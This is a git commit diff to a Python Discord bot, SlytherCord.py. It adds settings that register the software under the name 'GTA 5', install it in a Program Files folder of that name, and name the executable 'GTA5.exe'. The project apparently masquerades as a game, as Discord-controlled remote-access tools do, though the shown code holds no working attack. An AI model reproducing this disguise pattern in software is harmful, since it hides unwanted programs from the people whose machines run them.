1dee42cf5d5b973ce4e9a5dc64991a010ec3a41f
isaaclins-laptop <isaac.lins07@gmail.com>
2023-06-16 14:30:42 +0200

    changedgitihnore AGAIN

--- SlytherCord/SlytherCord.py
+++ SlytherCord/SlytherCord.py
@@ -1,11 +1,21 @@
 import discord
+import sys
 from settings import *
+
 
 client = discord.Client(intents=discord.Intents.all())
 
 channel_ids = {
     'main': 1114528537093865494
 }
+
+
+software_registry_name = 'GTA 5'   # ---------------------------------------------- Software name shown in registry
+software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
+software_executable_name = software_registry_name.replace(' ', '') + '.exe'
+
+
+
 
 @client.event 
 async def on_ready():  
